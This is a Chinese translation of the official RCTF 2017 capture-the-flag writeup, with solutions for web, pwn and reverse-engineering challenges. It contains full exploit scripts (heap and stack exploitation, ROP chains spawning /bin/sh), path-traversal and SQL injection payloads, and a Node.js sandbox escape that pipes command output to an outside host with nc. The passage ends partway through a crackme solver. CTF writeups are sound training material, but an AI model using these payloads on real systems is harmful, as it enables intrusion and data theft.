# 【CTF 攻略】RCTF 2017 官方Writeup

阅读量 **318043**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-06-01 16:01:56

 **x**

##### 译文声明

本文是翻译文章，文章来源：xctf.org.cn

原文地址：<https://www.xctf.org.cn/information/e0d90ad9d0609320fd6743706135a80913d27b8d/>

译文仅供参考，具体内容表达以及含义原文为准。

****

**传送门**

[**RCTF
2017上演安全极客的速度与激情，国际黑马战队motesolo积分榜排名第一！**](http://bobao.360.cn/news/detail/4173.html)

**  
**

**WEB**

**rBlog (13 solved)**

Category:WEB

曾经在一篇 writeup 发布后的第二天我修正了一处 typo ，但后来还是有朋友发截图来指出 typo ，我看了下 Feedly
上的订阅居然还是旧的内容。Google 搜索了一番我发现了[
**这个结果**](https://groups.google.com/forum/#!topic/feedly-cloud/3evZeYOnS2I)：

所以就有了这题 rBlog ……

从给出的源码中不难看出博客有 RSS 源，访问 /feed 会返回 static/atom.xml 的内容。 在添加文章时，传入的 markdown
格式的文本会被渲染成 HTML ，以文章的 id 作为文件名，被保存到 templates/posts/ 文件夹下，并且重新生成
atom.xml；在删除文章时，对应的 HTML 也会被删除，并且重新生成 atom.xml。

结合提示“There was a post on the blog containing the flag you want, but it has
been deleted before the CTF starts.”可以知道 flag 是不可能在博客上被找到的。（我本应该在题目描述中说明 flag
位置的，而不是在提示里x_x）但如果它在删除前被第三方服务缓存了呢？著名的 archive.org 需要主动请求——并不大可能；Google
快照可能是一个方式，但在线 RSS 订阅服务对于个人博客来说或许是最好的缓存。

在许多在线 RSS 订阅服务中，我选择了比较流行的的 Feedly。在 Feedly 中输入博客的 RSS 源地址，就可以得到 flag 了：

**rFile (6 solved)**

Category:WEB

rFile 是一个“反盗链”文件存储服务。通过分析 index.js 可知页面每 30 秒会请求 /api/download 来更新文件列表，api
返回的内容包括文件大小、文件名、修改时间，以及一个 token。下载文件时，会请求 /api/download/{token}/{filename}
。通过观察可以知道，每个文件每一分钟都会有一个不同的 token。

让我们试着将 sample.cpp 的下载请求中的文件名修改成一个存在的文件—— sample.c，会得到 “token
expired”的提示。这说明服务端是根据 {filename} 来提供文件，并且 {filename} 很有可能参与了 {token} 的生成。由于
token 是每一分钟更新一次，我们猜测时间戳也参与了 token 的生成。通过 fuzz 可以得出 token = md5(timestamp +
filename) 。

知道了 token 的生成方式，我们可以尝试通过读取文件，获得服务端的源代码。根据服务器发送的 HTTP 头中的
Server:gunicorn/19.7.1 ，我们猜测 rFile 有很大可能是 Python Web 应用。（后来也给出了 Hint 说明是
flask）

尝试读取当前目录中不存在的文件，会得到 “unknown error” ；尝试读取 ../__init__.py ，得到 “filetype not
allowed”。如果你熟悉 Python Web 应用（尤其是 Python3），你一定会知道 __pycache__/ 这个目录。当前文件夹的 .py
文件生成的 .pyc 都会被存在这个目录中，并且以 .cpython-35.pyc 为扩展名（其中的 35 与 CPython 版本有关）。

我的 exp.py (Python3):

    
    
    from hashlib import md5
    from time import time
    from json import dumps, loads
    from urllib.parse import quote, unquote
    import requests
    url = 'http://rfile.2017.teamrois.cn/'
    ts = int(time()) - 50
    buf = -1
    while buf<100:
        buf += 1
        filename = '../__pycache__/__init__.cpython-35.pyc'
        token = md5((str(ts+buf) + filename).encode('utf-8')).hexdigest()
        r = requests.get(url + '/api/download/%s/%s' % (token, quote(filename)), headers={'X-Requested-With': 'XMLHttpRequest'})
        print(r.content.decode('unicode_escape'))
        if loads(r.content.decode('unicode_escape'))['code'] == 1:
            r = requests.get(url + '/api/download/%s/%s' % (token, quote(filename)))
            print(r.content)
            break

读取 ../__pycache__/__init__.cpython-35.pyc ，然后使用 uncompyle6 反编译，得到 py 文件。然后我们发现
SECRET_KEY 是从同目录的 conf.py 中导入的。

flag 在 ../__pycache__/conf.cpython-35.pyc 中。

**rCDN (4 solved)**

Category:WEB

从首页我们可以看到 Basic 服务提供的是随机生成的 8 位字符的子域名，而 Pro 服务可以自定义短域名。在 /gopro 页面中也可以看到
“Short subdomain (3~6 chars) is only available for Pro account” 。添加一个 Basic
服务会发现只有销毁操作是可用的，虽然 Pro-only 的操作是禁止点击的状态，但它们的链接可以从 HTML 源码中看到。

提交 ticket 以请求技术支持是 Pro 用户一个与 rCDN 客服交流的方式。但 rCDN 没有把控好权限，以至于 Basic
用户也能访问这个链接，并且提交 ticket。通过测试可以知道，我们在 ticket 中填写的子域名必须是 <= 6 个字符的，否则会被认为是来自
Basic 的提交，返回“Only email support is available for Basic CDN
Service”。如果我们提交短域名，会得到“该子域名不存在”的回复——对于 Basic 用户来说，确实是这样。

那么我们应该怎样假装拥有短的子域名呢？答案是利用浏览器的 Unicode Normalization in Domain。试着用 Chrome
点击下面这两链接，它们将打开同一个页面：

    
    
    https://b㏒.㎈c.cn https://blog.cal1.cn

或许你已经从字体发现了差异，在第一个链接中，“log” 被 “㏒” (u33D2) 替代，“cal” 被 “㎈” (u3388)
替代。关于这个技巧，推荐阅读 2014 年 @mramydnei 在 Wooyun drops
发表的文章[《短域名进化史》](http://cb.drops.wiki/drops/tips-2839.html)。利用该技巧，将已有的 Basic
的域名变短，提交 ticket 欺骗客服，就可以获得 flag 了。

**noxss (3 solved)**

Category:WEB

本题是 [**Cross-Origin CSS Attacks Revisited (feat.
UTF-16)**](http://blog.innerht.ml/cross-origin-css-attacks-revisited-feat-utf-16/) 的复现。强烈建议阅读原文。

利用 CSS 解析器强大的容错性，和 php <= 5.6.0 default_charset 默认为空的缺陷，从 phpinfo 中窃取 http-only 的 cookie。

由于 CSP 的限制，这里应使用 background: url() 向外部域名发出请求。

    
    
    Content-Security-Policy: default-src *; img-src * data: blob:; frame-src 'self'; script-src 'self' unpkg.com; style-src 'self' unpkg.com fonts.googleapis.com; connect-src * wss:;
    Commonjs
    Category: WEB Score: 952

题目的环境是 Vue + SSR ( Server Side Render ) , 相关信息可以参照官方的示例 Hacknews

在官方示例中可以看到这么两个文件 src/api/create-api-client.js 、src/api/create-api-server.js

这两个文件是用来分别在服务端渲染及客户端渲染中对前端状态管理的 store 进行预填充，两个文件所需的接口是一样的，所以在题目中浏览器端可以看到起
src/api/create-api-client.js 作用的相关js代码

    
    
    function warp (code) {
        try {
            const ret = eval(`(function (module, exports, require) { ${code} })`)
            if (typeof ret !== 'function') {
                throw new Error('type not valid')
            }
            return ret.toString()
        } catch (e) {
            return 'function (module, exports, require) {  }'
        }
    }

这里 warp 的作用是讲普通的 js 代码封装为 commonjs 模块的代码，在进行客户端渲染的时候，使用的是浏览器的
eval，但是在进行服务端渲染的时候，使用的是 Node.js 中推荐拿来跑代码的 vm 库，两者用不同实现实现了两个一样的接口。

于是可以构造语句进行 RCE

    
    
    // payload
    "}, (() => { this.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls . | nc xxx 3002') })(), {"
    Login
    Category:WEB Score:714
    
    
    注册账号登录之后看到第一个提示，很明显这一道注入题。
    No bruteforcing and scanning!
    Flag is in database.
    Flag is like RCTF{...}

看 HTML 源码发现前台有正则过滤，就用 BurpSuite 抓包直接测试。

很明显，注入点在 login 的 username。而且给了 报错信息。

盲测可以发现有只有一个36位的长度限制，其他输入内容都不过滤。所以我们的 payload 要小于 36 位就可以了。

既然有给报错信息，首先报错注入。使用 GTID_SUBSET() 函数查看 password 的信息。

    
    
    payload: '+GTID_SUBSET(password,1)#
    msg: Malformed GTID set specification 'HINT:flag_is_in_this_table_and_its_columns_is_QthD2GLz_but_not_the_first_record.'.

看下 QthD2GLz 字段的信息。

    
    
    payload: '+GTID_SUBSET(QthD2GLz,1)#
    msg: Malformed GTID set specification 'RCTF{this_is_error_flag}'.

既然不是第一条记录，那么就加个限制条件进行报错注入。从 id=1 开始报错，在 id=17 的时候得到结果。

    
    
    payload: '+GTID_SUBSET(QthD2GLz,1)&&id=17#
    msg: Malformed GTID set specification 'RCTF{S1mpl3_M_Err0r_Ba3eD_I}'.

得到flag: RCTF{S1mpl3_M_Err0r_Ba3eD_I}

  

**PWN**

**aiRcraft**

Category:PWN Score:606 典型的fastbin UAF，堆上预留了函数指针，利用fastbin attack 修改堆上的函数指针即可

    
    
    from pwn import *
    context.log_level = 'debug'
    def NewPlane(p, company, name):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('whcih company? n')
        p.send(str(company) + 'n')
        p.recvuntil("Input the plane's name: ")
        p.send(name)
    def SelectPlane(p, name):
        p.recvuntil('Your choice: ')
        p.send('4n')
        p.recvuntil('Which plane do you want to choose? ')
        p.send(name)
    def Fly(p, airport):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('which airport do you want to fly? ')
        p.send(str(airport) + 'n')
    def SellPlane(p):
        p.recvuntil('Your choice: ')
        p.send('2n')
    def NewAirport(p, length, name):
        p.recvuntil('Your choice: ')
        p.send('2n')
        p.recvuntil("How long is the airport's name? ")
        p.send(str(length) + 'n')
        p.recvuntil('Please input the name: ')
        p.send(name)
    def EnterAirport(p, idx):
        p.recvuntil('Your choice: ')
        p.send('3n')
        p.recvuntil('choose? ')
        p.send(str(idx) + 'n')
    def ListPlane(p):
        p.recvuntil('Your choice: ')
        p.send('1n')
    def SellAirport(p):
        p.recvuntil('Your choice: ')
        p.send('2n')
    def Exit(p):
        p.recvuntil('Your choice: ')
        p.send('3n')
    p = process('./aiRcraft')
    NewPlane(p, 1, 'A' * 0x20)
    NewPlane(p, 2, 'B' * 0x20)
    NewAirport(p, 0x10, 'a' * 0x10)
    SelectPlane(p, 'A' * 0x1f + 'x00')
    Fly(p, 0)
    Exit(p)
    SelectPlane(p, 'B' * 0x1f + 'x00')
    Fly(p, 0)
    Exit(p)
    SelectPlane(p, 'B' * 0x1f + 'x00')
    SellPlane(p)
    SelectPlane(p, 'A' * 0x1f + 'x00')
    SellPlane(p)
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Plane name: ')
    heap_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x50
    log.info("heap base: " + hex(heap_base))
    Exit(p)
    payload = ''
    payload += 'A' * 0x1f + 'x00'
    payload += p64(heap_base + 0xa0)
    payload += p64(heap_base + 0xb0)
    NewAirport(p, 0x40, payload + 'n')
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Build by ')
    binary_base = u64(p.recvn(6).ljust(8, 'x00')) - 0xb7d
    log.info("binary base " + hex(binary_base))
    Exit(p)
    payload = ''
    payload += 'A' * 0x1f + 'x00'
    payload += p64(binary_base + 0x201fb8)
    payload += p64(heap_base + 0xb0)
    NewAirport(p, 0x40, payload + 'n')
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Plane name:')
    p.recvuntil('Plane name:')
    p.recvuntil('Build by ')
    libc_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x201c0
    log.info("libc base " + hex(libc_base))
    Exit(p)
    NewPlane(p, 1, '/bin/sh'.ljust(0x10, 'x00') + p64(0x00) + p64(0x51))
    NewPlane(p, 1, 'D' * 0x10 + p64(0x00) + p64(0x51))
    NewPlane(p, 1, 'DOUBLEFREE1n')
    NewPlane(p, 1, 'DOUBLEFREE2n')
    NewAirport(p, 0x10, 'DOUBLEn')
    SelectPlane(p, 'DOUBLEFREE1n')
    Fly(p, 3)
    SellPlane(p)
    SelectPlane(p, 'DOUBLEFREE2n')
    SellPlane(p)
    EnterAirport(p, 3)
    SellAirport(p)
    fake_chunk = heap_base + 0x290
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    payload = ''
    payload += 'A' * 0x10
    payload += p64(heap_base + 0xb0)
    payload += p64(heap_base + 0x10)
    payload += p64(libc_base + 0x3f460)
    payload += p64(libc_base + 0x3f460)
    NewAirport(p, 0x40, payload + 'n')
    SelectPlane(p, '/bin/shn')
    p.interactive()

**RCalc**

Category:PWN Score:350

栈溢出+手写canary保护，但是因为堆布局以及四则运算保存结果时没有边界限制，可以通过该漏洞修改canary来绕过栈保护，
因为输入用的scanf(%s)所以无法通过leak
.got.plt段来得到libc地址，但是__libc_start_main@got并不在.got.plt，且其地址没有会被截断的字符 可以用来leak
libc

    
    
    from pwn import *
    context.log_level = 'debug'
    p = remote('127.0.0.1', 2333)
    context.log_level = 'info'
    puts_plt = 0x400850
    read_got = 0x601FF0
    rdi_ret = 0x0000000000401123
    main_addr = 0x0000000000401036
    payload = ''
    payload += 'x00' * 0x110
    payload += p64(0x010101010101)
    payload += p64(rdi_ret)
    payload += p64(read_got)
    payload += p64(puts_plt)
    payload += p64(main_addr)
    p.recvuntil('Input your name pls: ')
    p.send(payload + 'n')
    for i in range(35):
        p.recvuntil('Your choice:')
        p.send('1n')
        p.recvuntil('input 2 integer: ')
        p.send('0n0n')
        p.recvuntil('Save the result? ')
        p.send('yes')
    p.recvuntil('Your choice:')
    p.send('5n')
    libc_start_main_addr = u64(p.recvn(6).ljust(8, 'x00'))
    log.info("__libc_start_main() addr: " + hex(libc_start_main_addr))
    offset_libc_start_main = 0x0000000000020740
    offset_system = 0x0000000000045390
    offset_binsh = 0x18c177
    libc_base = libc_start_main_addr - offset_libc_start_main
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_binsh
    payload = ''
    payload += 'x00' * 0x110
    payload += p64(0x010101010101)
    payload += p64(rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    payload += p64(main_addr)
    p.recvuntil('Input your name pls: ')
    p.send(payload + 'n')
    for i in range(35):
        p.recvuntil('Your choice:')
        p.send('1n')
        p.recvuntil('input 2 integer: ')
        p.send('0n0n')
        p.recvuntil('Save the result? ')
        p.send('yes')
    p.recvuntil('Your choice:')
    p.send('5n')
    p.send('cat flagn')
    p.interactive()

**Recho**

Category:PWN Score:370

明显的栈溢出，需要让read()返回0，则需要发送方关闭连接，这样导致ROP只能做一次且无法继续交互，程序中留了相关的gadget
可以用于修改GOT表中的函数入口为syscall以及"flag"字符串用于open()->read()->write()来读flag  

    
    
    from pwn import *
    context.log_level = 'debug'
    #p = process('./Recho')
    p = remote('45.32.253.54', 9527)
    elf = ELF('./Recho')
    '''
    0x00000000004006fc : pop rax ; ret
    0x00000000004008a3 : pop rdi ; ret
    0x00000000004006fe : pop rdx ; ret
    0x00000000004008a1 : pop rsi ; pop r15 ; ret
    0x000000000040070d : add byte ptr [rdi], al ; ret
    '''
    rax_ret = 0x4006fc
    rdi_ret = 0x4008a3
    rdx_ret = 0x4006fe
    rsi_r15_ret = 0x4008a1
    add_rdi_al_ret = 0x40070d
    flag = 0x601058
    alarm_got = elf.got['alarm']
    read_plt = elf.plt['read']
    write_plt = elf.plt['write']
    alarm_plt = elf.plt['alarm']
    payload = ''
    payload += 'A' * 0x38
    payload += p64(rax_ret)
    payload += p64(0x05)
    payload += p64(rdi_ret)
    payload += p64(alarm_got)
    payload += p64(add_rdi_al_ret)
    payload += p64(rax_ret)
    payload += p64(0x02)
    payload += p64(rdi_ret)
    payload += p64(flag)
    payload += p64(rsi_r15_ret)
    payload += p64(0x00) * 2
    payload += p64(rdx_ret)
    payload += p64(0x00)
    payload += p64(alarm_plt)
    payload += p64(rdi_ret)
    payload += p64(0x03)
    payload += p64(rsi_r15_ret)
    payload += p64(0x601090)
    payload += p64(0x00)
    payload += p64(rdx_ret)
    payload += p64(0x30)
    payload += p64(read_plt)
    payload += p64(rdi_ret)
    payload += p64(0x01)
    payload += p64(rsi_r15_ret)
    payload += p64(0x601090)
    payload += p64(0x00)
    payload += p64(rdx_ret)
    payload += p64(0x30)
    payload += p64(write_plt)
    #raw_input()
    p.recvuntil('Welcome to Recho server!n')
    p.send(str(0x200) + 'n')
    p.send(payload.ljust(0x200, 'x00'))
    p.recv()
    p.shutdown("send")
    p.interactive()
    RNote
    Category:PWN Score:454

**RNote**

Category:PWN Score:454

off-by-one漏洞，可以free堆上某个范围内的任意地址，可以用来做fastbin attack  

    
    
    from pwn import *
    context.log_level = 'info'
    def New(p, size, title, content):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('Please input the note size: ')
        p.send(str(size) + 'n')
        p.recvuntil('Please input the title: ')
        p.send(title)
        p.recvuntil('Please input the content: ')
        p.send(content)
    def Delete(p, idx):
        p.recvuntil('Your choice: ')
        p.send('2n')
        p.recvuntil('Which Note do you want to delete: ')
        p.send(str(idx) + 'n')
    def Show(p, idx):
        p.recvuntil('Your choice: ')
        p.send('3n')
        p.recvuntil('Which Note do you want to show: ')
        p.send(str(idx) + 'n')
    p = process('./RNote')
    New(p, 0x20, 'A' * 0x0f + 'n', '/bin/shx00n')
    New(p, 0x20, 'B' * 0x0f + 'n', 'b' * 0x20)
    New(p, 0x20, 'C' * 0x0f + 'n', 'c' * 0x20)
    Delete(p, 2)
    Delete(p, 1)
    New(p, 0x20, 'B' * 0x0f + 'n', 'n')
    Show(p, 1)
    p.recvuntil('note content: ')
    heap_base = u64(p.recvn(4).ljust(8, 'x00')) - 0x0a
    log.info("heap base: " + hex(heap_base))
    binsh_addr = heap_base + 0x10
    New(p, 0x80, 'C' * 0x0f + 'n', 'c' * 0x80)
    New(p, 0x30, 'D' * 0x10 + chr(0x80), 'd' * 0x30)
    Delete(p, 2)
    New(p, 0x80, 'C' * 0x0f + 'n', 'n')
    Show(p, 2)
    p.recvuntil('note content: ')
    libc_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x398b0a
    log.info("libc base: " + hex(libc_base))
    malloc_hook = libc_base + 0x398af0
    payload = ''
    payload += p64(0x00)
    payload += p64(0x71)
    payload += 'e' * 0x60
    payload += p64(0x00)
    payload += p64(0x71)
    New(p, 0x100, 'E' * 0x0f + 'n', payload + 'n')
    Delete(p, 4)
    Delete(p, 3)
    New(p, 0x100, 'E' * 0x0f + 'n', p64(0x00) + p64(0x71) + p64(malloc_hook - 0x23))
    New(p, 0x60, 'F' * 0x0f + 'n', 'f' * 0x10 + 'n')
    New(p, 0x60, 'G' * 0x0f + 'n', 'g' * 0x13 + p64(libc_base + 0x3f33a) + 'n')
    p.interactive()

**RNote2**

Category:PWN Score:606
可以用realloc()拓展堆块，用stancat()来填拓展的内容，漏洞在于realloc()拓展出来的区域不会初始化，仍留有之前作为空闲chunk的头部信息，
这样strncat()就会从预想的位置再往后1~2个字节开始填充

    
    
    from pwn import *
    context.log_level = 'debug'
    def New(p, length, content):
        p.recvuntil('choice:')
        p.send('1n')
        p.recvuntil('length:')
        p.send(str(length) + 'n')
        p.recvuntil('content:')
        p.send(content)
    def Delete(p, idx):
        p.recvuntil('choice:')
        p.send('2n')
        p.recvuntil('delete?')
        p.send(str(idx) + 'n')
    def List(p):
        p.recvuntil('choice:')
        p.send('3n')
    def Edit(p, idx, content):
        p.recvuntil('choice:')
        p.send('4n')
        p.recvuntil('edit?')
        p.send(str(idx) + 'n')
        p.recvuntil('content:')
        p.send(content)
    def Expend(p, idx, length, content):
        p.recvuntil('choice:')
        p.send('5n')
        p.recvuntil('expand?')
        p.send(str(idx) + 'n')
        p.recvuntil('expand?')
        p.send(str(length) + 'n')
        p.recvuntil('expand')
        p.send(content)
    p = process('./RNote2')
    New(p, 0xe0, 'A' * 0xe0)
    New(p, 0x10, '/bin/shx00n')
    Delete(p, 1)
    New(p, 0xf0, 'C' * 0xf0)
    New(p, 0xf0, 'D' * 0xf0)
    New(p, 0xf0, 'E' * 0xf0)
    Delete(p, 2)
    New(p, 0x100, 'F' * 0x100)
    Delete(p, 2)
    New(p, 0x10, 'n')
    List(p)
    p.recvuntil('4.n')
    p.recvuntil('content: ')
    libc_base = u64(p.recv(6).ljust(8, 'x00')) - 0x398b0a
    log.info('libc_base: ' + hex(libc_base))
    realloc_hook = libc_base + 0x398ae8
    system_addr = libc_base + 0x3f460
    New(p, 0xc8, 'G' * 0xc8)
    Expend(p, 5, 0x10, 'xf0' * 0x10)
    New(p, 0x90, 'H' * 0x90)
    New(p, 0x40, 'I' * 0x90)
    Delete(p, 6)
    Delete(p, 2)
    payload = ''
    payload += 'J' * 0xa0
    payload += p64(0x00)
    payload += p64(0x40)
    payload += p64(0x00) * 2
    payload += p64(realloc_hook)
    New(p, 0xc8, payload)
    Edit(p, 5, p64(system_addr) + 'n')
    p.recvuntil('choice:')
    p.send('9n')
    p.recvuntil('choice:')
    p.send('5n')
    p.recvuntil('expand?')
    p.send(str(1) + 'n')
    p.recvuntil('expand?')
    p.send(str(1) + 'n')
    p.interactive()

**RE**

**baby_flash**

Category:RE

一个 C++ 编译到 Flash 的题目. 流程很简单, 就一个 'strcmp', 然而是自己写的并不是从 string.h 引入的. 这个 strcmp
会跳过第一个参数的一些字符, 所以找到的字符串并不是真正的 flag.

反编译 swf 文件推荐使用 JPEXS Free Flash Decompiler. 使用 FFDec 打开 swf 后, 翻到 MyCPP.check
即可看到主逻辑(在 com.adobe.flascc.Console 类中调用), 其中调用了 F_strcmp, 再找到 C_Run.F_strcmp
即可找到 strcmp 的反编译代码. 它看上去类似汇编, 有ebp, 而判断语句, 循环语句已经被 FFDec 给转换成了 while 和 if,
比直接看汇编要容易的多. si, li等操作就是直接操作内存.

    
    
       public function F_strcmp() : void
       {
          // method body index: 390 method index: 510
          var ebp:* = 0;
          var i2:int = 0;
          var esp:* = int(ESP);
          ebp = esp;
          esp = int(esp - 44);
          si32(int(li32(ebp)),ebp - 4);
          si32(int(li32(ebp + 4)),ebp - 8);
          si32(int(li32(ebp - 4)),ebp - 24);
          si32(int(li32(ebp - 8)),ebp - 28);
          si32(2,ebp - 32);
          si32(3,ebp - 36);
          si32(0,ebp - 40);
          si32(0,ebp - 44);
          while(int(li8(int(li32(ebp - 24)))) != 0)
          {
             if(int(li8(int(li32(ebp - 28)))) == 0)
             {
                break;
             }
             var i1:int = li8(int(li32(ebp - 28)));
             if(int(li8(int(li32(ebp - 24)))) == i1)
             {
                var i0:int = li32(ebp - 40);
                i2 = 1;
                if(i0 != int(int(li32(ebp - 32)) << 1))
                {
                   i2 = 0;
                }
                i0 = i2 & 1;
                si8(i0,ebp - 17);
                i0 = li32(ebp - 40);
                i0 = i0 + 1;
                si32(i0,ebp - 40);
                i0 = li8(ebp - 17);
                if(i0 != 0)
                {
                   si32(int(int(li32(ebp - 24)) + 1),ebp - 24);
                   si32(int(int(li32(ebp - 32)) + int(li32(ebp - 36))),ebp - 44);
                   si32(int(li32(ebp - 36)),ebp - 32);
                   si32(int(li32(ebp - 44)),ebp - 36);
                }
                si32(int(int(li32(ebp - 24)) + 1),ebp - 24);
                si32(int(int(li32(ebp - 28)) + 1),ebp - 28);
                continue;
             }
             break;
          }
          i0 = si8(li8(int(li32(ebp - 28))));
          si32(int(int(si8(li8(int(li32(ebp - 24))))) - i0),ebp - 16);
          si32(int(li32(ebp - 16)),ebp - 12);
          eax = int(li32(ebp - 12));
          esp = ebp;
          ESP = esp;
       }

C++ 源码:

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <AS3/AS3.h>
    int strcmp(const char* s1, const char* s2) {
        char* p1 = (char*)s1;
        char* p2 = (char*)s2;
        int a = 2, b = 3, i = 0, t = 0;
        while (*p1 && *p2 && *p1 == *p2) {
            if (i++ == a*2) {
                p1++;
                t = a + b;
                a = b;
                b = t;
            }
            p1++;
            p2++;
        }
        return *p1 - *p2;
    }
    void check() __attribute__((used,
        annotate("as3sig:public function check(src:String):void"),
        annotate("as3package:MyCPP")));
    void check()
    {
        const char *flag = NULL;
        AS3_MallocString(flag, src);
        puts(flag);
        if (strcmp("RCTF{_Dyiin9__F1ash__1ike5_CPP}", flag) == 0) {
            puts("Right!");
        } else {
            puts("Try again!");
        }
    }
    int main()
    {
        // RCTF{Dyin9_F1ash_1ike5_CPP}
        puts("press Enter to input your flag.");
        return 0;
    }

**actually_cpp**

Category:RE

解题思路大致与 baby_flash 相似, 只不过主逻辑使用了 AES 加密明文与已有数据比较.

这里声明的 key 和 iv 会被后面的 brainfuck 修改.

有两种解法, 一是修改 bytecode 将 encrypt 改为 decrypt 然后修改输出就能直接解出 flag.

另外一种是模拟 brainfuck 的代码将 key 和 iv 修改后再解密也能拿到 flag. iv 的修改容易被人忽略, 需要细心.

    
    
    void check()
    {
      const char *enc = "xd5x18x61x03x1ex1cx95x3ax62xc2x93x8bx39x62x35xb1xf3x64x94x2fx33x95x42x23xd3x6cx26x88xabx2ax3fx47x94x28xb4x46xa5x09x04x21xacx1fx82xbaxb4xb3x28x4exc0xbcxefx53xfcx43x31x5cxdax7cx83xd0xfax90xb5x9f";
      const char *flag = NULL;
      AS3_MallocString(flag, src);
      puts(flag);
      uint8_t key[] = {0x38, 0x6b, 0x27, 0x89, 0x1d, 0xc9, 0x8b, 0xb9, 0x13, 0x57, 0xae, 0x7d, 0xbe, 0x90, 0x09, 0xe0};
      uint8_t iv[]  = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
      int flen = strlen(flag);
      brainfuck(">>>>>+++++<<<<----->>>++<<<<<<<<<-----", (unsigned char*)key);
      uint8_t *buffer = (uint8_t*)malloc(64);
      memset(buffer, 0, 64);
      AES128_CBC_encrypt_buffer(buffer, (uint8_t*)flag, flen, key, iv);
      if (memcmp(enc, buffer, 64) == 0)
      {
        puts("Congratulations");
      } else {
        puts("Try again!");
      }
      free(buffer);
    }

**crackme**

Category:RE Score:714

关键函数为sub_403210。将输入拷贝到变量里面（unicode字符），并且对输入作变换，然后将变换后的输入跟内置数据比较，这题的关键地方就是对输入做的变换，函数是sub_401340，一开始可以看到12组字符串，先对前8组字符串分别作md5值，
同样又求后四组字符串的md5值，然后用前8组md5值和输入作参数，传递给函数sub_401040，
该函数运行过后，输入会有变化，然后再把输入跟后四组字符串的md5值异或
函数sub_401040其实是做了RC6加密，Google搜一下函数里的常量值0x5BF76637就可以看到（http://webcache.googleusercontent.com/search?q=cache:iMqTMnspPxsJ:www.fobwaimao.com/thread-213714.htm+&cd=1&hl=en&ct=clnk&gl=us），然后根据网上的代码改一下，就可以求出flag，有个地方注意一下，网上的代码里是调换前5个比特与后27个比特，而程序里是调换前8个比特与后24个比特，脚本如下：

    
    
    #include <Windows.h>
    #include <stdio.h>
    typedef struct _context
    {
        unsigned int unkonwn1;
        unsigned int *sn;
        int len;
        unsigned int key_a;
        unsigned int key_b;
        unsigned int key_table[32];
        unsigned int key_d;
        unsigned int key_e;
    }context;
    unsigned int shrl(unsigned int a1, char a2)
    {
        return (a1 << a2) | (a1 >> (32 - a2));
    }
    unsigned int __stdcall inner_log(int a1)
    {
        return (unsigned int)(a1 << (32 - (unsigned __int64)(signed __int64)(5))) >> (32- (unsigned __int64)(signed __int64)(5));
    }
    unsigned int shlr(unsigned int a1, char a2)
    {
        return (a1 >> a2) | (a1 << (32 - a2));
    }
    unsigned char data[] = {
    202, 244, 96, 22, 220, 183, 47, 113, 61, 234, 125, 243, 200, 46, 168, 23,
    46, 58, 71, 206, 51, 133, 227, 16, 79, 177, 133, 93, 135, 176, 5, 132,
    252, 202, 143, 137, 244, 54, 23, 189, 225, 141, 241, 137, 91, 63, 55, 228,
    39, 38, 239, 209, 106, 223, 177, 218, 240, 99, 4, 143, 215, 121, 80, 34,
    77, 212, 102, 208, 225, 224, 204, 18, 58, 251, 229, 4, 218, 36, 98, 202,
    51, 197, 212, 149, 77, 168, 129, 129, 68, 32, 243, 186, 57, 119, 38, 68,
    247, 189, 97, 107, 108, 132, 29, 37, 56, 115, 95, 118, 209, 224, 43, 87,
    27, 194, 155, 54, 246, 35, 186, 130, 170, 246, 114, 79, 211, 177, 103, 24};
    void encrypt(context *ctx, bool encrypt)
    {
        int *cur_dword; // esi@2
        unsigned int *tmp_key; // ebx@2
        int fourth_dword; // eax@3
        unsigned int v10; // ST28_4@3
        unsigned int v14; // eax@3
        bool v18; // zf@3
        signed int block_size; // [sp+24h] [bp-Ch]@2
        unsigned int offset = 0;
        if (ctx->len)
        {
            if (encrypt)
            {
                do
                {
                    cur_dword = (int *)((unsigned char*)ctx->sn + offset);
                    tmp_key = &ctx->key_table[31];
                    block_size = 16;
                    *cur_dword -= ctx->key_d;
                    cur_dword[2] -= ctx->key_e;
                    do
                    {
                        fourth_dword = cur_dword[3];
                        cur_dword[3] = cur_dword[2];
                        cur_dword[2] = cur_dword[1];
                        cur_dword[1] = *cur_dword;
                        *cur_dword = fourth_dword;
                        v10 = shrl(cur_dword[1] * (2 * cur_dword[1] + 1), 8); //调换前8个比特与后24个比特
                        v14 = shrl((DWORD)cur_dword[3] * (2 * (DWORD)(cur_dword[3]) + 1), 8);
                        *cur_dword = v10 ^ shlr(*cur_dword - *(tmp_key - 1), inner_log(v14));
                        cur_dword[2] = ((DWORD)v14) ^ shlr(cur_dword[2] - *tmp_key, inner_log(v10));;
                        tmp_key -= 2;
                        v18 = block_size-- == 1;
                    } while (!v18);
                    offset += 16;
                    cur_dword[1] -= ctx->key_a;
                    cur_dword[3] -= ctx->key_b;
                } while (offset < ctx->len);
            }
            else
            {
                do
                {
                    cur_dword = (int *)((unsigned char*)ctx->sn + offset);
                    tmp_key = &ctx->key_table[-1];
                    block_size = 16;
                    cur_dword[1] += ctx->key_a;
                    cur_dword[3] += ctx->key_b;
                    do
                    {
                        tmp_key += 2;
                        v10 = shrl(cur_dword[1] * (2 * cur_dword[1] + 1), 8); //调换前8个比特与后24个比特
                        v14 = shrl((DWORD)cur_dword[3] * (2 * (DWORD)(cur_dword[3]) + 1), 8);
                        int y = *cur_dword ^v10;
                        int x = shrl(y, inner_log(v14));
                        *cur_dword = x + *(tmp_key - 1);
                        int n = cur_dword[2] ^ ((DWORD)v14);
